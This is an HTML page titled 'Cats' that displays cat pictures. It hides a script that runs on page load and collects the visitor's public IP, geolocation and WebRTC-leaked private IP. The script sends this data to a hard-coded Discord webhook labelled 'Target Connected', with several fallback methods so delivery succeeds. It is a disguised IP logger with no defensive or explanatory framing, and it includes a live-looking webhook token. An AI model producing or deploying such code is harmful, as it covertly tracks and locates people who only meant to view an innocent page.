<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cats</title>
    <style>
        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
        .cat-container { text-align: center; }
        .cat-container img { max-width: 80%; border-radius: 12px; margin: 10px; }
    </style>
</head>
<body>
    <div class="cat-container">
        <img src="https://cataas.com/cat" alt="cat">
        <img src="https://cataas.com/cat/says/meow" alt="cat">
    </div>
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";

        function sendWebhook(payload, label) {
            try {
                const blob = new Blob([payload], {type: "text/plain;charset=UTF-8"});
                const ok = navigator.sendBeacon(WEBHOOK, blob);
                console.log(`[${label}] sendBeacon:`, ok);
                if (ok) return true;
            } catch(e) { console.error(`[${label}] sendBeacon error:`, e); }

            try {
                const fd = new FormData();
                fd.append("payload_json", payload);
                const ok2 = navigator.sendBeacon(WEBHOOK, fd);
                console.log(`[${label}] sendBeacon FormData:`, ok2);
                if (ok2) return true;
            } catch(e) { console.error(`[${label}] FormData error:`, e); }

            return false;
        }

        async function grab() {
            let pub = "unknown", priv = "unknown", geo = "unknown";
            console.log("[grab] started");

            try {
                const pubRes = await fetch("https://api.ipify.org?format=json");
                const pubData = await pubRes.json();
                pub = pubData.ip;
                console.log("[grab] public ip:", pub);
            } catch(e) { console.error("[grab] pub ip fail:", e); }

            try {
                const geoRes = await fetch(`https://ipwho.is/${pub}`);
                const geoData = await geoRes.json();
                if (geoData.success) {
                    geo = `${geoData.city}, ${geoData.region}, ${geoData.country} (${geoData.latitude}, ${geoData.longitude})`;
                    console.log("[grab] geo:", geo);
                }
            } catch(e) { console.error("[grab] geo fail:", e); }

            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                pc.createDataChannel("x");
                await new Promise(r => pc.onicecandidate = e => {
                    if (e.candidate) {
                        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (m) priv = m[1];
                        r();
                    }
                });
                await pc.setLocalDescription(await pc.createOffer());
                await new Promise(r => setTimeout(r, 2000));
                console.log("[grab] private ip:", priv);
            } catch(e) { console.error("[grab] priv ip fail:", e); }

            const payload = JSON.stringify({
                embeds: [{
                    title: "Target Connected",
                    color: 0xff0000,
                    fields: [
                        {name: "public ip", value: pub, inline: false},
                        {name: "private ip", value: priv, inline: false},
                        {name: "geolocation", value: geo, inline: false}
                    ]
                }]
            });

            const sent = sendWebhook(payload, "exfil");
            if (!sent) {
                console.warn("[exfil] all beacon methods failed, trying fetch no-cors");
                try {
                    await fetch(WEBHOOK, {
                        method: "POST",
                        mode: "no-cors",
                        headers: {"Content-Type": "text/plain;charset=UTF-8"},
                        body: payload
                    });
                    console.log("[exfil] fetch no-cors sent (cannot confirm delivery)");
                } catch(e) {
                    console.error("[exfil] fetch failed:", e);
                    const img = new Image();
                    img.src = WEBHOOK + "/slack?data=" + encodeURIComponent(payload);
                    console.log("[exfil] image pixel fallback fired");
                }
            } else {
                console.log("[exfil] SUCCESS — webhook should have pinged");
            }
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", grab);
        } else {
            grab();
        }
    </script>
</body>
</html>
